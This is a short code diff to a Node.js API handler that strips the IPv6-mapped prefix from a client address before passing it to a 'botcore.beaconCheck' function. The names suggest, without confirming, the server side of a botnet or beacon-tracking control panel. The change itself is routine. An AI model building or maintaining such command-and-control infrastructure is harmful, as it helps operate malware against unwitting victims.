@@ -47,7 +47,8 @@ exports.apihandler = function(req, res){
 				var cks = req.param('cks');
 				
 				// executing beacon handler
-				botcore.beaconCheck(nxid, req.connection.remoteAddress, urlprm, cks, function(err, bres){
+				botcore.beaconCheck(nxid, req.connection.remoteAddress.replace('::ffff:', ''), urlprm, cks, 
+				function(err, bres){
 					
 					// fail safe bail out
 					if(err){errorlog.error(err); response.state = false; res.send(response, 402);}
